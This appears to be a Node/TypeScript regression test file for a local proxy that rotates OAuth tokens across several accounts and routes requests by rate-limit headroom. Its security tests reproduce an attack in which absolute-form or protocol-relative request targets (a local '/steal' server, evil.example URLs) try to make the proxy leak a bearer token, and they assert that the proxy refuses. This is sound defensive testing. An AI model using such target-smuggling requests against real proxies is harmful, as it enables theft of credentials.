// Regression tests for defects found in adversarial review.
//
// The headline one is real and was reproduced before the fix: a local process
// could make the proxy attach a live OAuth bearer token to a request aimed at
// an arbitrary host.

import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { after, test } from 'node:test';

import { isOriginFormTarget, retryAfterMs, startProxy } from '../src/proxy.js';
import { mergeClaims } from '../src/accounts.js';
import { parseClaims } from '../src/claims.js';
import { computeHeadroom, selectAccount } from '../src/policy.js';
import type { AccountState } from '../src/policy.js';
import { MAX_PENDING_FRAME_BYTES, UsageCollector } from '../src/usage.js';
import { GATEWAY_API_KEY_SENTINEL } from '../src/client-launch.js';

const cleanups: (() => void)[] = [];
after(() => {
  for (const c of cleanups.reverse()) {
    try {
      c();
    } catch {
      /* ignore */
    }
  }
});

function tmp(prefix: string): string {
  const dir = mkdtempSync(path.join(os.tmpdir(), prefix));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

function fakeAuthswap(token: string): string {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    path.join(dir, '.credentials-1-a@x.com.json'),
    JSON.stringify({ claudeAiOauth: { accessToken: token, expiresAt: Date.now() + 3_600_000 } }),
  );
  return root;
}

async function listen(server: http.Server): Promise<number> {
  await new Promise<void>(r => server.listen(0, '127.0.0.1', () => r()));
  cleanups.push(() => server.close());
  return (server.address() as { port: number }).port;
}

/** Send a raw request line so we control the request TARGET form exactly. */
function rawRequest(port: number, requestLine: string): Promise<string> {
  return new Promise(resolve => {
    let received = '';
    const socket = net.connect(port, '127.0.0.1', () => {
      socket.write(
        `${requestLine} HTTP/1.1\r\nHost: 127.0.0.1:${port}\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
      );
    });
    socket.on('data', d => (received += d.toString('utf8')));
    socket.on('close', () => resolve(received));
    socket.on('error', () => resolve(received));
    setTimeout(() => {
      socket.destroy();
      resolve(received);
    }, 4000);
  });
}

test('an absolute-form request target cannot exfiltrate an account token', async () => {
  const TOKEN = 'SECRET-OAUTH-TOKEN-MARKER';
  const authswapRoot = fakeAuthswap(TOKEN);

  let stolen: string | undefined;
  const attackerPort = await listen(
    http.createServer((req, res) => {
      stolen = req.headers.authorization;
      res.writeHead(200).end('pwned');
    }),
  );
  const upstreamPort = await listen(
    http.createServer((_req, res) => {
      res.writeHead(200).end('{}');
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const response = await rawRequest(port, `POST http://127.0.0.1:${attackerPort}/steal`);

  assert.equal(stolen, undefined, 'no credential reached the attacker origin');
  assert.match(response, /^HTTP\/1\.1 400/, 'the request target was refused outright');
});

test('a protocol-relative target is refused for the same reason', async () => {
  const authswapRoot = fakeAuthswap('tok');
  let stolen: string | undefined;
  const attackerPort = await listen(
    http.createServer((req, res) => {
      stolen = req.headers.authorization;
      res.writeHead(200).end('x');
    }),
  );
  const upstreamPort = await listen(
    http.createServer((_r, res) => {
      res.writeHead(200).end('{}');
    }),
  );
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const response = await rawRequest(port, `POST //127.0.0.1:${attackerPort}/steal`);
  assert.equal(stolen, undefined);
  assert.match(response, /^HTTP\/1\.1 400/);
});

test('normal origin-form targets are still accepted', () => {
  assert.equal(isOriginFormTarget('/v1/messages'), true);
  assert.equal(isOriginFormTarget('/v1/messages?beta=true'), true);
  assert.equal(isOriginFormTarget('http://evil.example/x'), false);
  assert.equal(isOriginFormTarget('https://evil.example/x'), false);
  assert.equal(isOriginFormTarget('//evil.example/x'), false);
  assert.equal(isOriginFormTarget('/\\evil.example'), false);
  assert.equal(isOriginFormTarget('*'), false);
  assert.equal(isOriginFormTarget(undefined), false);
});

// --- claim observation merging -------------------------------------------

test('an Opus response does not erase the Fable weekly budget', () => {
  const fable = parseClaims({
    'anthropic-ratelimit-unified-5h-utilization': '0.20',
    'anthropic-ratelimit-unified-7d-utilization': '0.30',
    'anthropic-ratelimit-unified-7d_oi-utilization': '0.96',
  });
  // A later Opus request carries no 7d_oi header at all.
  const opus = parseClaims({
    'anthropic-ratelimit-unified-5h-utilization': '0.25',
    'anthropic-ratelimit-unified-7d-utilization': '0.35',
  });

  const merged = mergeClaims(fable, opus);
  assert.equal(merged.byId['5h']?.utilization, 0.25, 'fresh values win');
  assert.equal(merged.byId['7d']?.utilization, 0.35);
  assert.equal(merged.byId['7d_oi']?.utilization, 0.96, 'the Fable budget survives');

  // and the evacuation rule still fires for Fable on the merged state
  const account: AccountState = { slot: '1', health: 'ok', claims: merged };
  const h = computeHeadroom(account, 'claude-fable-5', Date.now());
  assert.equal(h.evacuating, true, '96% Fable utilization must still evacuate');
});

// --- stale rejected claims ------------------------------------------------

test('a rejected claim whose window has reset does not strand the account', () => {
  const now = 2_000_000_000_000;
  const stale = parseClaims({
    'anthropic-ratelimit-unified-7d-status': 'rejected',
    'anthropic-ratelimit-unified-7d-utilization': '1.0',
    // reset one minute in the past
    'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now - 60_000) / 1000)),
  });
  const account: AccountState = { slot: '1', health: 'ok', claims: stale };

  const h = computeHeadroom(account, 'claude-opus-5', now);
  assert.equal(h.headroom, 1, 'the window rolled over; the rejection is stale');
  assert.equal(h.evacuating, false);

  const s = selectAccount({ accounts: [account], model: 'claude-opus-5', nowMs: now });
  assert.equal(s.slot, '1', 'the account is selectable again');
});

test('a rejected claim that has NOT reset still blocks the account', () => {
  const now = 2_000_000_000_000;
  const live = parseClaims({
    'anthropic-ratelimit-unified-7d-status': 'rejected',
    'anthropic-ratelimit-unified-7d-utilization': '1.0',
    'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now + 3_600_000) / 1000)),
  });
  const h = computeHeadroom({ slot: '1', health: 'ok', claims: live }, 'claude-opus-5', now);
  assert.equal(h.headroom, 0);
});

// --- retry breadth --------------------------------------------------------

test('every account is tried before reporting exhaustion', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2', '3', '4', '5']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  const seen: string[] = [];
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      const auth = req.headers.authorization ?? '';
      seen.push(auth);
      req.resume();
      req.on('end', () => {
        // Only the LAST slot succeeds.
        if (auth === 'Bearer tok-5') {
          res.writeHead(200, {}).end('{"ok":true}');
        } else {
          res.writeHead(429, {}).end('{}');
        }
      });
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
  assert.equal(res.status, 200, 'the fifth account was reached');
  assert.equal(await res.text(), '{"ok":true}');
  assert.equal(new Set(seen).size, 5, 'all five distinct accounts were tried');
});

// --- session pinning race -------------------------------------------------

test('concurrent opening requests for one session land on the same account', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  const seen: string[] = [];
  // Hold every response open briefly so the requests genuinely overlap.
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      seen.push(req.headers.authorization ?? '');
      req.resume();
      setTimeout(() => res.writeHead(200, {}).end('{}'), 120);
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const send = (p: string) =>
    fetch(`http://127.0.0.1:${port}${p}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-claude-code-session-id': 'race-session' },
      body: JSON.stringify({ model: 'claude-opus-5' }),
    });

  await Promise.all([send('/v1/messages'), send('/v1/messages/count_tokens'), send('/v1/messages')]);

  assert.equal(seen.length, 3);
  assert.equal(new Set(seen).size, 1, `session split across accounts: ${[...new Set(seen)].join(', ')}`);
});

// --- stream failure -------------------------------------------------------

test('an upstream that dies mid-body does not hang the client forever', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      res.writeHead(200, { 'content-type': 'text/event-stream' });
      res.write('event: message_start\ndata: {"type":"message_start"}\n\n');
      // Kill the socket without ending the response.
      setTimeout(() => res.socket?.destroy(), 50);
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const finished = await Promise.race([
    fetch(`http://127.0.0.1:${port}/v1/messages`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ model: 'claude-opus-5', stream: true }),
    })
      .then(r => r.text())
      .then(() => 'settled')
      .catch(() => 'settled'),
    new Promise(r => setTimeout(() => r('HUNG'), 5000)),
  ]);
  assert.equal(finished, 'settled', 'the client request terminated rather than hanging');
});

test('the response body is forwarded with its bytes unchanged', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const plain = 'event: message_start\ndata: {"type":"message_start"}\n\n';
  const gz = zlib.gzipSync(Buffer.from(plain, 'utf8'));

  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      req.on('end', () => {
        res.writeHead(200, {
          'content-type': 'text/event-stream',
          'content-encoding': 'gzip',
          'content-length': String(gz.length),
        });
        res.end(gz);
      });
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  // Raw socket: fetch would transparently gunzip and hide a re-encode.
  const raw = await new Promise<Buffer>(resolve => {
    const chunks: Buffer[] = [];
    const socket = net.connect(port, '127.0.0.1', () => {
      const body = JSON.stringify({ model: 'claude-opus-5' });
      socket.write(
        `POST /v1/messages HTTP/1.1\r\nHost: x\r\ncontent-type: application/json\r\n` +
          `Content-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`,
      );
    });
    socket.on('data', d => chunks.push(d as Buffer));
    socket.on('close', () => resolve(Buffer.concat(chunks)));
    setTimeout(() => {
      socket.destroy();
      resolve(Buffer.concat(chunks));
    }, 4000);
  });

  const sep = raw.indexOf('\r\n\r\n');
  const bodyBytes = raw.subarray(sep + 4);
  assert.ok(bodyBytes.equals(gz), 'compressed bytes must be relayed verbatim, not re-encoded');
});

// --- observer memory ------------------------------------------------------

test('a body with no frame delimiter does not grow the collector without bound', () => {
  const c = new UsageCollector();
  const chunk = 'x'.repeat(64 * 1024);
  for (let i = 0; i < 200; i += 1) c.push(chunk); // 12.8 MB with no "\n\n"
  assert.equal(c.overflowed, true);
  assert.ok(
    c['buffer'].length <= MAX_PENDING_FRAME_BYTES,
    `collector retained ${c['buffer'].length} bytes`,
  );
});

test('usage still parses correctly after an overflow-triggering preamble', () => {
  const c = new UsageCollector();
  c.push('x'.repeat(MAX_PENDING_FRAME_BYTES + 1024));
  c.push('\n\nevent: message_delta\ndata: {"usage":{"output_tokens":42}}\n\n');
  assert.equal(c.end().outputTokens, 42);
});

// --- model-scoped affinity ------------------------------------------------

test('a Fable decision does not move the account holding the Opus prefix', async () => {
  const { AffinityStore } = await import('../src/affinity.js');
  const store = new AffinityStore({ stateRoot: tmp('cab-sec-st-') });

  store.touch('sess', '1', 'claude-opus-5');
  store.touch('sess', '2', 'claude-fable-5');

  assert.equal(store.lookup('sess', 'claude-opus-5'), '1', 'Opus lease is untouched');
  assert.equal(store.lookup('sess', 'claude-fable-5'), '2');
});

// --- evacuation horizon ---------------------------------------------------

test('a 5h window that refills before the cache expires does not trigger a paid move', () => {
  const now = 2_000_000_000_000;
  const account: AccountState = {
    slot: '1',
    health: 'ok',
    claims: parseClaims({
      'anthropic-ratelimit-unified-5h-utilization': '0.96',
      // resets in seven minutes
      'anthropic-ratelimit-unified-5h-reset': String(Math.floor((now + 7 * 60_000) / 1000)),
      'anthropic-ratelimit-unified-7d-utilization': '0.35',
    }),
  };
  const h = computeHeadroom(account, 'claude-opus-5', now);
  assert.equal(h.evacuating, false, 'the bucket refills long before the 1h cache does');

  const s = selectAccount({
    accounts: [account, { slot: '2', health: 'ok' }],
    model: 'claude-opus-5',
    affinitySlot: '1',
    nowMs: now,
  });
  assert.equal(s.decision, 'affinity-hold');
  assert.equal(s.slot, '1');
});

test('a weekly window still beyond the cache horizon does evacuate at 95%', () => {
  const now = 2_000_000_000_000;
  const account: AccountState = {
    slot: '1',
    health: 'ok',
    claims: parseClaims({
      'anthropic-ratelimit-unified-7d-utilization': '0.96',
      'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now + 3 * 86_400_000) / 1000)),
    }),
  };
  assert.equal(computeHeadroom(account, 'claude-opus-5', now).evacuating, true);

  const s = selectAccount({
    accounts: [account, { slot: '2', health: 'ok' }],
    model: 'claude-opus-5',
    affinitySlot: '1',
    nowMs: now,
  });
  assert.equal(s.slot, '2');
  assert.equal(s.decision, 'affinity-broken');
});

test('a rejected claim does not fabricate a 100% utilization figure', () => {
  const now = 2_000_000_000_000;
  const account: AccountState = {
    slot: '1',
    health: 'ok',
    claims: parseClaims({
      'anthropic-ratelimit-unified-7d-status': 'rejected',
      'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now + 86_400_000) / 1000)),
    }),
  };
  const h = computeHeadroom(account, 'claude-opus-5', now);
  assert.equal(h.headroom, 0, 'still unusable');
  assert.equal(h.peakUtilization, undefined, 'the server never sent a utilization number');
});

// --- credential hygiene ---------------------------------------------------

test('a stray x-api-key is not forwarded alongside the substituted bearer', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  let sawApiKey: string | undefined;
  let sawAuth: string | undefined;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      sawApiKey = req.headers['x-api-key'] as string | undefined;
      sawAuth = req.headers.authorization;
      req.resume();
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-api-key': GATEWAY_API_KEY_SENTINEL },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });

  assert.equal(sawApiKey, undefined, 'the non-secret gateway selector must never leave localhost');
  assert.equal(sawAuth, 'Bearer tok-1');
});

// --- retry-after ----------------------------------------------------------

test('a short retry-after is waited out rather than paying a cache re-create', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  const seen: string[] = [];
  let first = true;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      seen.push(req.headers.authorization ?? '');
      req.resume();
      req.on('end', () => {
        if (first) {
          first = false;
          res.writeHead(429, { 'retry-after': '1' }).end('{}');
        } else {
          res.writeHead(200, {}).end('{"ok":true}');
        }
      });
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-claude-code-session-id': 'wait-session' },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
  assert.equal(res.status, 200);
  assert.deepEqual(seen, ['Bearer tok-1', 'Bearer tok-1'], 'waited on the warm account');
});

test('retry-after parses both delta-seconds and an HTTP date', () => {
  const now = 1_700_000_000_000;
  assert.equal(retryAfterMs({ 'retry-after': '8' }, now), 8000);
  assert.equal(retryAfterMs({ 'retry-after': '0' }, now), 0);
  assert.equal(retryAfterMs({}, now), undefined);
  assert.equal(retryAfterMs({ 'retry-after': 'nonsense' }, now), undefined);
  assert.equal(retryAfterMs({ 'retry-after': new Date(now + 5000).toUTCString() }, now), 5000);
});
